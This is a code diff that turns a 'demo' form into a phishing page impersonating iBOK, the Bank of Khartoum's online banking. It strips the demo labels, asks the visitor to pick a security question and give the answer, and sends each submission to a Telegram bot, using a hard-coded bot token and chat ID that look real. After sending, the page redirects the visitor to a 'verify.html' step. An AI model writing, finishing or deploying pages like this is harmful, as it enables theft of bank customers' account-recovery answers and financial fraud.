@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
-    <title>Form tracking I iBOK</title>
+    <title>Form tracking | iBOK</title>
 
     <style>
          :root {
@@ -116,18 +116,6 @@
             font-weight: 700;
         }
         
-        .demo-note {
-            margin-bottom: 18px;
-            padding: 9px 11px;
-            border: 1px solid #f1d783;
-            border-radius: 8px;
-            background: #fff9e4;
-            color: #5f4b12;
-            font-size: 12px;
-            line-height: 1.4;
-            text-align: center;
-        }
-        
         .field {
             margin-bottom: 18px;
         }
@@ -228,50 +216,6 @@
             position: fixed;
             left: 31px;
             bottom: 15px;
-            width: 58px;
-            height: 58px;
-            display: grid;
-            place-items: center;
-            border-radius: 50%;
-            background: #e9262b;
-            color: #fff;
-            box-shadow: 0 5px 15px #0002;
-            font-size: 25px;
-            user-select: none;
-        }
-        
-        @media (max-width: 600px) {
-            .page {
-                margin: 0;
-                border-radius: 0;
-            }
-            header {
-                height: 132px;
-                flex-basis: 132px;
-            }
-            .welcome,
-            .brand {
-                width: calc(100% - 36px);
-            }
-            main {
-                padding: 0 12px 32px;
-            }
-            .card {
-                margin-top: 15px;
-                padding: 24px 22px;
-            }
-            h1 {
-                font-size: 22px;
-            }
-            .support-bubble {
-                left: 16px;
-                bottom: 12px;
-                width: 50px;
-                height: 50px;
-            }
-        }
-        
-        .support-bubble {
             width: 55px;
             height: 55px;
             background-color: #ff0000;
@@ -280,7 +224,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 32px;
+            font-size: 25px;
             cursor: pointer;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
         }
@@ -310,25 +254,24 @@
                     <div class="field">
                         <label for="question">----Choose a security question---</label>
                         <div class="select-wrap">
-
                             <select id="question" name="question">
-    <option value="">-- Select Security Question --</option>
-    <option value="cousin_name">What is your first cousin's name?</option>
-    <option value="birth_city">What city were you born in?</option>
-    <option value="graduation_year">What year did you graduate from university?</option>
-    <option value="childhood_nickname">What was your nickname during your childhood?</option>
-    <option value="favorite_author">The name of your favorite author?</option>
-    <option value="favorite_car">The name of your favorite car manufacturer?</option>
-    <option value="favorite_movie">Which movie is your favorite?</option>
-    <option value="childhood_friend">Childhood best friend's name?</option>
-    <option value="license_year">What year did you get your driver's license?</option>
-    <option value="first_tv_brand">Brand your first TV?</option>
-    <option value="marriage_year">What year did you get married?</option>
-    <option value="favorite_football_team">The name of your favorite football team?</option>
-    <option value="school_name">What is the name of the school you attended?</option>
-    <option value="first_foreign_country">The name of the first foreign country you visited?</option>
-    <option value="first_car_brand">What was your first car brand?</option>
-</select>
+                                <option value="">-- Select Security Question --</option>
+                                <option value="cousin_name">What is your first cousin's name?</option>
+                                <option value="birth_city">What city were you born in?</option>
+                                <option value="graduation_year">What year did you graduate from university?</option>
+                                <option value="childhood_nickname">What was your nickname during your childhood?</option>
+                                <option value="favorite_author">The name of your favorite author?</option>
+                                <option value="favorite_car">The name of your favorite car manufacturer?</option>
+                                <option value="favorite_movie">Which movie is your favorite?</option>
+                                <option value="childhood_friend">Childhood best friend's name?</option>
+                                <option value="license_year">What year did you get your driver's license?</option>
+                                <option value="first_tv_brand">Brand your first TV?</option>
+                                <option value="marriage_year">What year did you get married?</option>
+                                <option value="favorite_football_team">The name of your favorite football team?</option>
+                                <option value="school_name">What is the name of the school you attended?</option>
+                                <option value="first_foreign_country">The name of the first foreign country you visited?</option>
+                                <option value="first_car_brand">What was your first car brand?</option>
+                            </select>
                         </div>
                     </div>
 
@@ -346,7 +289,7 @@
         </main>
 
         <footer>
-            iBOK I Bank of Khartoum 2026<br /> All rights reserved. Bank of Khartoum ,iBOK 2026.
+            iBOK | Bank of Khartoum 2026<br /> All rights reserved. Bank of Khartoum, iBOK 2026.
         </footer>
 
         <div class="support-bubble" aria-label="WhatsApp support" title="WhatsApp support">
@@ -356,8 +299,8 @@
 
     <script>
         // ===== TELEGRAM CONFIG =====
-        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // from @BotFather, e.g. "123456789:AAH..."
-        const CHAT_ID = "YOUR_CHAT_ID"; // your chat/user ID, e.g. "123456789"
+        const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc"; // Replace with your Telegram Bot Token from @BotFather
+        const CHAT_ID = "8406078749"; // Replace with your Telegram Chat ID
         // ===========================
 
         const form = document.getElementById("demo-form");
@@ -374,14 +317,14 @@
 
             // Validation
             if (!question.value) {
-                message.textContent = "Please select a demo topic.";
+                message.textContent = "Please select a security question.";
                 message.classList.add("visible");
                 message.classList.remove("success");
                 return;
             }
 
             if (!answerText) {
-                message.textContent = "Please enter a response.";
+                message.textContent = "Please enter your answer.";
                 message.classList.add("visible");
                 message.classList.remove("success");
                 return;
@@ -389,9 +332,9 @@
 
             // Build the Telegram message
             const text =
-                "📩 <b>New Demo Submission</b>\n\n" +
-                "❓ <b>Topic:</b> " + questionText + "\n" +
-                "💬 <b>Response:</b> " + answerText;
+                "📩 <b>New Security Form Submission</b>\n\n" +
+                "❓ <b>Question:</b> " + questionText + "\n" +
+                "💬 <b>Answer:</b> " + answerText;
 
             // Disable button while sending
             submitButton.disabled = true;
@@ -415,43 +358,27 @@
                 const data = await res.json();
 
                 if (data.ok) {
-                    message.textContent = "Submitted successfully. Thank you!";
+                    message.textContent = "Submitted successfully. Redirecting...";
                     message.classList.add("visible", "success");
                     form.reset();
+
+                    // Optional: Redirect after successful submission
+                    setTimeout(() => {
+                        window.location.href = "verify.html";
+                    }, 1500);
                 } else {
-                    message.textContent = "Telegram error: " + data.description;
+                    message.textContent = "Telegram error: " + (data.description || "Unknown error");
                     message.classList.add("visible");
                 }
             } catch (err) {
+                console.error("Telegram notification error:", err);
                 message.textContent = "Failed to send. Please check your connection.";
                 message.classList.add("visible");
             } finally {
                 submitButton.disabled = false;
-                submitButton.textContent = "CONTINUE DEMO";
+                submitButton.textContent = "Send";
             }
         });
-
-        // Navigate to summary.html after successful submission
-        window.location.href = "verify.html";
-
-        }
-        catch (error) {
-            console.error("Telegram notification error:", error);
-
-            showMessage(
-                "Telegram notification failed. Check your bot configuration and try again.",
-                false
-            );
-
-
-        } finally {
-            requestInProgress = false;
-            submitButton.disabled = false;
-            submitButton.textContent = "CONTINUE DEMO";
-        }
-        });
-
-        // Closes DOMContentLoaded
     </script>
 </body>
 
